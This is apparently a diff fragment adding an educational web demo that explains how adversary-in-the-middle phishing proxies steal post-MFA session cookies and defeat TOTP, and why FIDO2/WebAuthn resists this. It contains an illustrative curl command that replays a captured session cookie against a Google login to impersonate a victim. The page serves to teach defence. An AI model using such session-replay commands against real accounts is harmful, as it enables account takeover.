+# Even though cookie is HttpOnly, the PROXY sees it
+# in the HTTP response before passing to victim.
+
+# Attacker uses captured session:
+curl -b "GOOGLE_SESSION=abc...xyz" https://accounts.google.com/
+→ Fully authenticated as victim
+
+# TOTP was correctly entered — it doesn't matter.
+# The session cookie (not the OTP) is what grants access.
+# AiTM steals the session, not the code.`,
+    safe:`# ONLY FIDO2/WebAuthn is resistant to AiTM:
+
+WebAuthn binds credential to origin:
+  rpID: accounts.google.com
+
+When victim's authenticator receives challenge:
+  Origin in challenge: https://accounts.google.phishingdomain.com
+  Registered rpID:     accounts.google.com
+  
+  ≠ MATCH → Authenticator REFUSES to sign
+  
+Proxy cannot complete WebAuthn even with
+victim's cooperation — origin mismatch is
+cryptographically enforced.`,
+    verdict:'<strong>TOTP bypassed by AiTM — session cookie stolen in real-time!</strong> The proxy relayed the victim\'s legitimate OTP to Google, received a valid session cookie, and captured it. TOTP provides no protection against AiTM because the attacker steals the post-MFA session, not the code. Only FIDO2/WebAuthn hardware keys are phishing-resistant by cryptographic design.'
+  }
+};
+
+function runDemo(){
+  const k=document.getElementById('mfa-select').value;
+  const d=DEMOS[k];
+  document.getElementById('attack-out').innerHTML='<span style="color:#fbbf24">'+d.atk+'</span>';
+  document.getElementById('vuln-out').innerHTML='<span style="color:#f87171">'+d.vuln+'</span>';
+  document.getElementById('safe-out').innerHTML='<span style="color:#4ade80">'+d.safe+'</span>';
+  const v=document.getElementById('verdict');
+  v.className='result-box r-red';
+  v.innerHTML=d.verdict;
+}
+runDemo();
+</script>
+</body>
+</html>
